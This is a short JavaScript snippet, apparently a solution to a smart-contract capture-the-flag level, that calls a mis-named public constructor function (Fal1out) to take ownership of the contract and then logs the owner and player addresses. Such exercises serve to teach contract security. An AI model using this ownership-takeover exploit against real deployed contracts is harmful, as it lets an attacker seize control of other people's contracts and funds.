async function solve() {
  await contract.Fal1out();

  const owner = await contract.owner();
  const player = await signer.getAddress();

  console.log("Owner:", owner);
  console.log("Player:", player);
}

solve();
